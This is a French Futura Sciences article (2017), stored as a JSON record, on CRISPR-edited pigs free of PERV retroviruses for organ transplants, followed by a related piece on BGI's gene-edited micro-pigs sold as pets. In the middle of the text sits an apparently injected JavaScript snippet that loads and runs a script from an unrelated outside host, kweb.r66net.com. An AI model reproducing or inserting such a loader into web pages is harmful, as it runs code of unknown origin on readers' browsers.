{"title": "Des cochons OGM pour transplanter des organes", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "14/08/2017", "content": "L'entreprise eGenesis a annoncé avoir obtenu 37 petits cochons génétiquement modifiés en vue d'obtenir des organes transplantables chez l'Homme. Un rétrovirus porcin qui pouvait être gênant pour des greffes a été retiré du génome du cochon grâce à une technique d'édition génomique. Ce qu'il faut retenir Les rétrovirus PERV sont des virus porcins endogènes qui pourraient représenter un risque en cas de greffe chez l'Homme. Grâce à CRISPR-Cas9, les scientifiques ont retiré les gènes des rétrovirus présents dans le génome du cochon. Les petits cochons OGM sont en bonne santé mais des interrogations subsistent avant de greffer des organes porcins chez l'Homme. Transplanter des organes de cochon pour pallier le manque de donneurs, pourquoi pas ? Le porc possède des organes de taille proche de celle de l'Homme. Cependant, la technique ne serait pas forcément sans risque. En particulier, certains scientifiques s'inquiètent de la présence chez le cochon de  rétrovirus , les PERV ( Porcine Endogenous Retrovirus ). Les  gènes  de ces rétrovirus  endogènes , qui témoignent d'infections anciennes, sont  disséminés  dans le  génome  du cochon. On peut se demander si ces  virus  pourraient infecter un humain qui recevrait le cœur ou le  rein  d'un cochon. Une entreprise américaine, qui s'est donné comme objectif de produire des organes de cochons pour des  greffes , affirme avoir résolu ce problème : en utilisant la technique d'édition  génomique  CRISPR, les chercheurs ont créé plusieurs dizaines de petits cochons apparemment en bonne santé et sans trace de gènes de PERV. Pour cette nouvelle recherche parue dans  Science , l'entreprise a travaillé avec des scientifiques danois et chinois. Le système  CRISPR  a été appliqué sur des cellules de tissu conjonctif de  fœtus  de cochon. Pour obtenir les petits cochons, les chercheurs ont utilisé une technique de  clonage  : ils ont introduit les noyaux des cellules modifiées par CRISPR dans des  ovocytes  récupérés dans des  ovaires  de truies provenant d'un abattoir chinois. Les cellules œufs ont donné des  embryons  qui ont ensuite été implantés dans l' utérus  d'une truie. L’outil d’édition du génome CRISPR-Cas9 agit comme des ciseaux moléculaires qui peuvent découper des gènes. © Mopic, Fotolia                               Des interrogations sur la dangerosité des rétrovirus PERV D'après les résultats, les petits cochons génétiquement modifiés étaient en bonne santé. Les tissus des 37 cochons ont été testés et ils semblaient dépourvus de PERV. Toutefois, supprimer le problème PERV n'est pas suffisant pour envisager des greffes : d'autres modifications  génétiques  seront probablement nécessaires pour que les organes de cochon ne soient pas rejetés par le  système immunitaire  humain.  Le saviez-vous ? En France, en 2016, d'après l'agence de biomédecine, plus de 5.800 greffes ont été réalisées, dont plus de la moitié sont des greffes de rein. 22.000 patients ont été en attente d'une greffe d'organe.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En réalité, les scientifiques ne savent pas vraiment si les particules virales de PERV pourraient infecter les humains et causer des maladies humaines. D'après  Sciencemag , des scientifiques ont déjà implanté des cellules de  pancréas  de cochon chez des patients  diabétiques  sans avoir de problème avec PERV. Mais il s'agissait d'un petit nombre de cellules. La greffe de gros organes pourrait poser bien plus de problèmes.  Comme le risque lié aux PERV est incertain, des scientifiques se demandent si ces expériences étaient vraiment indispensables pour obtenir des organes prêts à transplanter. Ainsi, Muhammad Mohiuddin, un chirurgien de l'université du Maryland à Baltimore, qui travaille aussi avec une entreprise (United Therapeutics) pour développer des cœurs de cochons prêts à  implanter , émet des doutes :  « En ce moment, je ne pense pas que nous soyons très préoccupés par PERV » . L'étape d'édition génomique qui vise à supprimer les gènes PERV rend plus complexe le processus et ajoute un coût supplémentaire... Pour en savoir plus Science décalée : des mini-cochons OGM comme animaux de compagnie Article de  Marie-Céline Jacquier  paru le 4 octobre 2015 L'institut de génomique chinois BGI a annoncé qu'il allait vendre des petits cochons génétiquement modifiés comme animaux de compagnie au prix de 1.600 dollars. Au départ, ces animaux avaient été créés pour la recherche scientifique. Un  chien , un chat, c'est trop banal à votre goût ? Alors, essayez le micro-cochon génétiquement modifié : ces animaux adorables ont été « construits » pour la recherche mais se retrouvent maintenant sur le marché comme animaux de compagnie. En effet, les cochons sont souvent utilisés dans les expériences génétiques, car ils sont plus proches de l'Homme que des souris ou des rats, ce qui en fait des modèles d'étude pour des maladies humaines. Mais leur taille importante fait qu'ils coûtent plus cher que des  rongeurs  et nécessitent de plus grosses doses de médicaments lors des études. Ici, les micro-cochons présentés à Shenzhen, pèsent environ 15  kg , soit le même poids qu'un  chien  de taille moyenne et sont une version modifiée du  cochon  de Bama, un cochon chinois de petite  taille . Les cochons de Bama « naturels » pèsent entre 35 et 50 kg, tandis qu'un cochon de ferme avoisine plutôt les 110 kg. BGI a présenté ses micro-cochons tout mignons lors d’un sommet à Shenzhen en Chine. © BGI, Nature                               Pour créer ce modèle réduit de cochon de Bama, les scientifiques en ont cloné à partir de cellules provenant de fœtus de Bama. Mais avant de les cloner, ils ont utilisé le système Talen ( Transcription  activator-like effector nuclease ), qui sert à inactiver des gènes. Talen utilise une  protéine  qui s'associe à l' ADN  et guide une  enzyme  vers un  gène  pour le couper. Grâce à cela, il a été possible de désactiver une des deux copies du gène du récepteur de l' hormone  de croissance (GHR) dans les cellules d'un fœtus de Bama. En l'absence du récepteur de l'hormone de croissance, les cellules ne reçoivent pas le signal de croissance pendant le développement de l'animal, ce qui permet d'obtenir des cochons minuscules.  Ensuite les scientifiques ont croisé les  clones  de micro-mâles avec des femelles de taille normale. Environ la moitié de la portée ainsi obtenue était des micro-cochons. Les scientifiques expliquent que le fait de croiser les micro-mâles avec des femelles normales était préférable au  clonage  répété des animaux pour éviter des problèmes de santé. D'après l'institut de génomique chinois BGI qui a réalisé ces expériences, il n'y a pas eu d'effets secondaires sur la santé des 20 cochons de seconde génération ainsi obtenus. Cette vidéo montre un élevage en Chine de cochons nains de Bama. © CCTV Des manipulations génétiques qui soulèvent des questions éthiques La décision de commercialiser ces micro-cochons a surpris un généticien danois, Lars Bolund, qui avait aidé BGI dans son programme de recherche génétique sur cochons. Dans  Nature , il admet que les micro-cochons ont volé la vedette lors du sommet de Shenzhen :  « Les gens étaient attachés à eux. Tout le monde voulait les tenir » . Mais ces petits cochons en tant qu'animaux de compagnie soulèvent de nombreuses interrogations. Par exemple, que fera un micro-cochon s'il est enfermé dans un appartement sans pouvoir creuser dans la  terre  ? Fera-t-il des dégâts, sera-t-il abandonné ? Et quelles maladies risque-t-il de développer ? Ces animaux génétiquement modifiés posent à nouveau la question du contrôle  éthique  à exercer sur de telles expériences. L'institut de génomique BGI, déjà connu pour des expériences révolutionnaires dans le domaine génétique, souhaite dans un premier temps  « mieux évaluer le marché » . Yong Li, directeur technique de la plateforme de science animale à BGI, explique :  « Nous prévoyons de prendre les commandes des clients et de voir quelle est l'ampleur de la demande » . D'après BGI, les profits qui seraient tirés de la commercialisation des micro-cochons seraient réinvestis dans la recherche. La voie semble aussi toute tracée pour créer des chiens et des chats génétiquement modifiés... La greffe d’organe révolutionnée par les cellules souches ?                       Chaque année plus de 5.000 personnes bénéficient d’une greffe d’organe en France. Ces patients sont soumis à un lourd traitement pour empêcher le rejet suite à leur opération. Découvrez en vidéo et grâce à Discovery Science une technique basée sur les cellules souches qui pourrait permettre de contrer ce problème.                                       ", "theme": "planete"}